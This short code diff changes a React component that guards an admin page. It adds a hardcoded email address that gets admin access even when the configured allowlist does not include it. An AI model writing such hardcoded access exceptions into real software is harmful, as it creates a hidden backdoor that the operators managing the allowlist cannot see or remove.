@@ -61,7 +61,8 @@ function DeveloperOnly() {
     .split(",")
     .map((value) => value.trim().toLowerCase())
     .filter(Boolean);
-  if (!session || !email || !allowed.includes(email)) return <NotFound />;
+  const ownerAdminEmail = "princetechstudio@gmail.com";
+  if (!session || !email || (!allowed.includes(email) && email !== ownerAdminEmail)) return <NotFound />;
   return <Admin />;
 }
 
